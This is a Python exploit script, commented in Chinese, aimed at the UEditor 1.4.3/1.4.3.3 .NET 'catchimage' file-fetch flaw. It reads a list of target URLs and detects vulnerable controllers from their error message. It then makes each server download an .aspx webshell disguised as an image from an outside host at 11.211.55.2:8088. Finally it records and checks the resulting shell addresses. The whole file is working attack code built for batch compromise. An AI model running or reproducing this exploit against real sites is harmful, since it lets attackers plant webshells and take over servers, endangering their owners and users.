import os

import requests
from requests import exceptions
from termcolor import cprint
from urllib.parse import urlparse

success_url = []


def check_shell(url):
    r"""
    检测给定的url地址是否能正常访问(条件:状态码是否是200)
    :param url: str
    :return: bool
    """
    try:
        res = requests.get(url, timeout=(3, 6), allow_redirects=False)
        if res.status_code == 200 and res.text:
            return True
        else:
            return False
    except exceptions.ReadTimeout:
        cprint('[-]' + url + ' 连接超时', 'red')
        return False
    except exceptions.ConnectionError:
        cprint('[-]' + url + ' 连接失败', 'red')
        return False
    except ConnectionResetError:
        cprint('[-]' + url + ' 拒绝连接', 'red')
        return False
    except exceptions:
        return False


def get_shell():
    r"""
    获取ueditor(1.4.3、1.4.3.3)的上传的webshell地址
    :return: None
    """
    # 定义post请求的头部
    header = {
        'Host': '11.211.55.3:8981',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
                      'Chrome/92.0.4515.131 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;'
                  'q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'close'
    }
    # 定义post请求的body
    data = r'source[]=http://11.211.55.2:8088/2-1.jpg?.aspx'
    for i in success_url:
        try:
            res = requests.post(url=i + r'?action=catchimage&encode=utf-8', headers=header, data=data, timeout=(3, 7))
            # 上传成功，就从response中确定webshell地址
            if res.status_code == 200 and '{"state":"SUCCESS","list":[{"state":"SUCCESS","source":"' in res.text:
                res_json = res.json()  # 将response内容转换成json格式数据
                res_shell_path = res_json['list'][0]['url']  # 从json中获取webshell的尾部路径
                # 尾部路径为空说明没有成功，跳出循环，测试下一个url
                if not res_shell_path:
                    cprint('[-]' + i + ' 不存在漏洞...')
                    continue
                '''
                将url处理成如下格式
                ParseResult(scheme='http',netloc='11.211.55.3:8981',path='/ueditor/net/controller.ashx',params='',query='',fragment='')
                '''
                res_parse = urlparse(i)
                """
                'http' + '://' + '11.211.55.3:8981' + '/ueditor/net' + '/' + 'upload/image/20210917/6376749817900880002810400.aspx'
                """
                shell_url = res_parse.scheme + '://' + res_parse.netloc + os.path.dirname(
                    res_parse.path) + '/' + res_shell_path
                # 保存并打印webshell地址
                with open('shell.txt', 'a', encoding='utf-8') as w:
                    w.write(shell_url)
                    if check_shell(shell_url):
                        cprint('[+] shell 地址:' + shell_url, 'green')
                    else:
                        cprint('[+] shell 地址无法访问，请自己确认路径:' + shell_url, 'yellow')
        except exceptions.ReadTimeout:
            cprint('[-]' + i + ' 连接超时', 'red')
        except exceptions.ConnectionError:
            cprint('[-]' + i + ' 连接失败', 'red')
        except ConnectionResetError:
            cprint('[-]' + i + ' 拒绝连接', 'red')


def check_target():
    r"""
    从当前目录的target.txt获取目标网址，并将有漏洞的网址添加的全局变量success_url中
    :return: None
    """
    with open('target.txt', 'r') as f:
        for i in f.readlines():
            i = i.strip('\n')
            try:
                response = requests.get(i, timeout=(3, 6), allow_redirects=False)
                if response.status_code == 200 and response.text == '{"state":"action 参数为空或者 action 不被支持。"}':
                    success_url.append(i)
                else:
                    cprint('[-]' + i + ' 漏洞不存在', 'red')
                response.encoding = response.apparent_encoding
            except exceptions.ConnectTimeout:
                cprint('[-]' + i + ' 连接超时', 'red')
            except exceptions.ReadTimeout:
                cprint('[-]' + i + ' 读取失败', 'red')
            except exceptions.ConnectionError:
                cprint('[-]' + i + ' 无效地址', 'red')


if __name__ == '__main__':
    check_target()
    get_shell()
